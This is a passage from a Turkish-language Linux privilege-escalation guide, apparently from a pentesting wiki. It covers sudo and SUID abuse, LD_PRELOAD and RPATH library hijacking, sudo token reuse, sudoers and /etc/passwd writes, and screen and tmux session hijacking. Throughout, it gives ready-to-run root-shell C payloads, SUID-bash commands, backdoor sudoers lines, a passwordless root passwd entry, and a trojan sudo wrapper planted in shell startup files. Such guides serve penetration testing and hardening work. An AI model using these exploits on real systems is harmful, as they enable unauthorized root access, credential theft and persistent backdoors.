Bu, kendi başına doğrudan bir güvenlik açığı değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l`, `env_keep+=PATH` gösteriyorsa veya saldırgan tarafından yazılabilir girdiler (ör. `/home/<user>/bin`) içeren bir `secure_path` varsa, sudo tarafından izin verilen hedef içindeki göreli tüm komutlar gölgelenebilir.

- Gereksinimler: Mutlak yollar olmadan (`free`, `df`, `ps`, vb.) komutlar çağıran bir script/binary çalıştıran bir sudo kuralı (genellikle `NOPASSWD`) ve ilk sırada aranan, yazılabilir bir PATH girdisi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo yürütme yollarını bypass etme
Diğer dosyaları okumak veya **symlinks** kullanmak için **Jump**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**wildcard** kullanılırsa (\*), daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu olmayan Sudo command/SUID binary

**sudo izni**, yol belirtilmeden tek bir command için verildiyse: _hacker10 ALL= (root) less_ PATH variable'ını değiştirerek bunu exploit edebilirsiniz
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary'si **yolu belirtmeden başka bir komut çalıştırıyorsa da kullanılabilir (her zaman** _**strings**_ **ile şüpheli bir SUID binary'sinin içeriğini kontrol edin)**.

[Çalıştırılacak Payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu belirtilen SUID binary

**suid** binary'si **yolu belirterek başka bir komut çalıştırıyorsa**, suid dosyasının çağırdığı komutun adını taşıyan bir **function export** etmeyi deneyebilirsiniz.

Örneğin, bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, function'ı oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ardından, suid binary'yi çağırdığınızda bu işlev yürütülür

### SUID wrapper tarafından yürütülen yazılabilir script

Yaygın bir custom-app yanlış yapılandırması, bir script'i çalıştıran root-owned SUID binary wrapper'dır; script'in kendisi ise düşük ayrıcalıklı kullanıcılar tarafından yazılabilirdir.

Tipik desen:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
`/usr/local/bin/backup.sh` yazılabilirse, payload komutlarını ekleyebilir ve ardından SUID wrapper'ı çalıştırabilirsiniz:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Hızlı kontroller:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Bu attack path, `/usr/local/bin` içinde bulunan "maintenance"/"backup" wrapper'larında özellikle yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable'ı, loader tarafından diğer tüm shared library'lerden (standard C library (`libc.so`) dahil) önce yüklenmesi gereken bir veya daha fazla shared library'yi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir library'yi preload etmek olarak bilinir.

Ancak system security'yi korumak ve bu özelliğin, özellikle **suid/sgid** executable'larda exploit edilmesini önlemek için system belirli koşullar uygular:

- Loader, real user ID (_ruid_) effective user ID (_euid_) ile eşleşmeyen executable'lar için **LD_PRELOAD**'u dikkate almaz.
- suid/sgid içeren executable'lar için yalnızca standard path'lerde bulunan ve aynı zamanda suid/sgid olan library'ler preload edilir.

`sudo` ile command execute edebiliyorsanız ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa privilege escalation gerçekleşebilir. Bu configuration, `sudo` ile command'ler çalıştırıldığında **LD_PRELOAD** environment variable'ının korunmasına ve tanınmasına izin verir; bu da elevated privileges ile arbitrary code execution'a yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu şekilde kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından **derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **çalıştırarak ayrıcalıkları yükseltin**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Saldırgan **LD_LIBRARY_PATH** env variable değerini kontrol ediyorsa benzer bir privesc kötüye kullanılabilir; çünkü library'lerin aranacağı path'i kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

**SUID** izinlerine sahip olağandışı görünen bir binary ile karşılaşıldığında, **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, olası bir exploit fırsatına işaret eder.

Bundan yararlanmak için, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturup aşağıdaki kodu içerecek şekilde ilerlenebilir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlenip çalıştırıldıktan sonra dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını şu komutla bir shared object (.so) dosyasına derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'sini çalıştırmak exploit'i tetiklemeli ve potansiyel sistem ele geçirilmesine olanak tanımalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabildiğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli ada sahip library'yi bu klasörde oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Şu tür bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz library'nin `a_function_name` adlı bir function içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir attacker'ın local security restrictions'ı bypass etmek için exploit edebileceği Unix binary'lerinin derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir command'a **yalnızca argument inject edebildiğiniz** durumlar için aynı işlevi görür.

Project; restricted shell'lerden çıkmak, elevated privileges elde etmek veya bunları korumak, file transfer etmek, bind ve reverse shell başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için abuse edilebilecek Unix binary'lerinin legitimate function'larını bir araya getirir.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` erişiminiz varsa herhangi bir sudo rule'unu nasıl exploit edebileceğini bulup bulamadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool'unu kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo erişiminiz** olup password'e sahip olmadığınız durumlarda, **bir sudo command execution'ı bekleyip ardından session token'ını hijack ederek** privileges escalate edebilirsiniz.

Privileges escalate etmek için gerekenler:

- "_sampleuser_" kullanıcısı olarak zaten bir shell'iniz olmalı
- "_sampleuser_" **son 15 dakika içinde** bir şey execute etmek için **`sudo` kullanmış** olmalı (default olarak bu, herhangi bir password girmeden `sudo` kullanmamıza izin veren sudo token'ın süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (upload edebilmelisiniz)

(`ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile geçici olarak enable edebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` değerini ayarlayabilirsiniz.)

Tüm bu requirements karşılanıyorsa, **privileges'ı şu şekilde escalate edebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` binary'sini oluşturur. Bunu **session'ınızdaki sudo token'ı activate etmek** için kullanabilirsiniz (otomatik olarak bir root shell elde etmezsiniz; `sudo su` çalıştırın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid bitine sahip** bir sh shell oluşturur.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Üçüncü exploit** (`exploit_v3.sh`), **sudo token'larını kalıcı hâle getiren ve tüm kullanıcıların sudo kullanmasına izin veren bir sudoers dosyası oluşturur**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içinde oluşturulan dosyalardan herhangi biri üzerinde **write permissions** varsa, bir kullanıcı ve PID için **sudo token** **create** etmek amacıyla [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary'sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyor ve bu kullanıcı olarak PID'si 1234 olan bir shell'e sahipseniz, password'ü bilmenize gerek kalmadan aşağıdakini yaparak **sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo` komutunu kimlerin ve nasıl kullanabileceğini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu dosyayı** okuyabiliyorsanız **bazı ilginç bilgiler elde edebilirsiniz** ve herhangi bir dosyaya yazabiliyorsanız **ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine alternatifler vardır; yapılandırmasını `/etc/doas.conf` konumunda kontrol etmeyi unutmayın.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas` bir editor veya interpreter çalıştırmaya izin veriyorsa, GTFOBins-style escapes'leri kontrol edin:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlandığını ve ayrıcalıkları yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak çalıştıracak ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo executable** oluşturabilirsiniz. Daha sonra kullanıcının bağlamındaki **$PATH** değerini değiştirin (örneğin `.bash_profile` dosyasına yeni yolu ekleyerek); böylece kullanıcı sudo çalıştırdığında sizin sudo executable dosyanız çalıştırılır.

Kullanıcının farklı bir shell kullandığını (bash olmadığını) unutmayın; yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da aşağıdakine benzer bir şey çalıştırabilirsiniz:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden alındığını** belirtir. Genellikle bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **aranacağı** **diğer klasörleri** gösterir. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** şu yollardan herhangi biri üzerinde **yazma izinleri** varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasör üzerinde, ayrıcalıkları yükseltebilir.\
**Bu yanlış yapılandırmanın nasıl exploit edileceğine** aşağıdaki sayfadan göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib` dosyasını `/var/tmp/flag15/` dizinine kopyalayarak, `RPATH` değişkeninde belirtildiği üzere program tarafından bu konumda kullanılmasını sağlayabilirsiniz.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutuyla kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities, **kullanılabilir root ayrıcalıklarının bir alt kümesini bir process'e sağlar**. Bu, root **ayrıcalıklarını daha küçük ve birbirinden ayrı birimlere böler**. Bu birimlerin her biri daha sonra process'lere bağımsız olarak atanabilir. Bu şekilde ayrıcalıkların tamamı azaltılır ve exploitation riskleri düşürülür.\
**Capabilities ve bunların nasıl abuse edilebileceği hakkında daha fazla bilgi edinmek** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

Bir directory'de **"execute" biti**, etkilenen kullanıcının klasöre "**cd**" yapabileceği anlamına gelir.\
**"read" biti**, kullanıcının **files** listesini görüntüleyebileceği; **"write" biti** ise kullanıcının yeni **files** **silebileceği** ve **oluşturabileceği** anlamına gelir.

## ACLs

Access Control Lists (ACLs), **geleneksel ugo/rwx permissions'larını override edebilen** ikincil bir discretionary permissions katmanını temsil eder. Bu permissions, owner olmayan veya grubun parçası olmayan belirli kullanıcılar için haklara izin vererek ya da hakları reddederek file veya directory erişimi üzerindeki kontrolü artırır. Bu düzeydeki **granularity, daha hassas access management sağlar**. Daha fazla ayrıntıya [**buradan**](https://linuxconfig.org/how-to-manage-acls-on-linux) ulaşılabilir.

Bir file üzerinde "kali" kullanıcısına **read** ve **write** permissions **verin**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Sistemden belirli ACL'lere sahip dosyaları alın**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in dosyalarında gizli ACL backdoor'u

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` izinlerine sahip root tarafından sahiplenilen bir dosyanın ACL aracılığıyla düşük yetkili bir kullanıcıya hâlâ yazma erişimi vermesidir.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mod bitlerine rağmen bir sudo kuralı ekleyebilir:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Bu, `ls -l` ile yapılan incelemelerde kolayca gözden kaçabildiği için yüksek etkili bir ACL persistence/privesc yoludur.

## Open shell sessions

**Eski sürümlerde**, farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** ise screen oturumlarına yalnızca **kendi kullanıcınız** olarak **connect** olabileceksiniz. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listeleyin**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Soket konumları (bazı sistemler birini diğerinin symlink'i olarak sunar): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **old tmux versions** ile ilgili bir problemdi. Yetkisiz bir kullanıcı olarak root tarafından oluşturulan bir tmux (v2.1) session'ını hijack edemedim.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket konumları (bazı sistemler birini diğerinin symlink'i olarak sunar) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleme yapın; bu socket içinde bir tmux session başlatabilirsiniz...](<../../images/image (837).png>)

**Bir session'a bağlanın**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Örnek için **HTB'deki Valentine box**'ı inceleyin.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu vb.) oluşturulan tüm SSL ve SSH anahtarları bu bug'dan etkilenmiş olabilir.\
Bu bug, söz konusu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **yalnızca 32.768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olarak karşılık gelen private key'in aranabileceği** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Password authentication'a izin verilip verilmediğini belirtir. Varsayılan değer `no`'dur.
- **PubkeyAuthentication:** Public key authentication'a izin verilip verilmediğini belirtir. Varsayılan değer `yes`'dir.
- **PermitEmptyPasswords**: Password authentication etkin olduğunda, server'ın boş password string'lerine sahip account'lara login yapılmasına izin verip vermediğini belirtir. Varsayılan değer `no`'dur.

### Login control files

Bu dosyalar kimlerin login yapabileceğini ve bunun nasıl gerçekleşeceğini etkiler:

- **`/etc/nologin`**: Mevcutsa root olmayan login'leri engeller ve mesajını yazdırır.
- **`/etc/securetty`**: Root'un nereden login yapabileceğini kısıtlar (TTY allowlist).
- **`/etc/motd`**: Login sonrası banner (environment veya maintenance detaylarını leak edebilir).

### PermitRootLogin

Root'un ssh kullanarak login yapıp yapamayacağını belirtir; varsayılan değer `no`'dur. Olası değerler:

- `yes`: Root, password ve private key kullanarak login yapabilir
- `without-password` veya `prohibit-password`: Root yalnızca private key ile login yapabilir
- `forced-commands-only`: Root yalnızca private key kullanarak ve commands seçenekleri belirtilmişse login yapabilir
- `no` : hayır

### AuthorizedKeysFile

User authentication için kullanılabilecek public key'leri içeren dosyaları belirtir. Home directory ile değiştirilecek `%h` gibi token'lar içerebilir. **Absolute path'ler belirtebilirsiniz** (`/` ile başlayan) veya **user'ın home directory'sinden relative path'ler** kullanabilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, "**testusername**" kullanıcısının **private** key'iyle login olmaya çalıştığınızda, SSH'nin key'inizin public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarında bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, **key'leri sunucunuzda bırakmak yerine** (passphrase olmadan!) **local SSH key'lerinizi kullanmanıza** olanak tanır. Böylece SSH ile **bir host'a jump** edebilir ve oradan **initial host'unuzda** bulunan **key'i kullanarak** **başka bir host'a jump** edebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde aşağıdaki gibi ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
`Host` değeri `*` olduğunda, kullanıcı her farklı makineye geçtiğinde bu makine anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **options** değerini **override** edebilir ve bu yapılandırmaya izin verebilir veya erişimi reddedebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding işlemine **allow** veya **denied** verebilir (varsayılan değer allow'dur).

Bir ortamda Forward Agent yapılandırıldığını fark ederseniz aşağıdaki sayfayı okuyun; çünkü **privileges yükseltmek için bunu abuse edebilirsiniz**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **bir kullanıcı yeni bir shell çalıştırdığında yürütülen scriptlerdir**. Bu nedenle, bunlardan herhangi birine **write veya modify yapabiliyorsanız privileges yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir garip profil betiği bulunursa **hassas ayrıntılar** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya bir yedekleri bulunabilir. Bu nedenle **tamamını bulmanız** ve dosyaların içinde **hash olup olmadığını** görmek için **okuyup okuyamadığınızı kontrol etmeniz** önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasında **password hashes** bulabilirsiniz
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örn.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini azaltabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow`, `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı **hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, herhangi bir **service configuration file** dosyasına yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat service configuration dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz tomcat bir sonraki kez başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Etme

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız, ancak deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konumlu/Sahipli Dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son dakikalarda değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
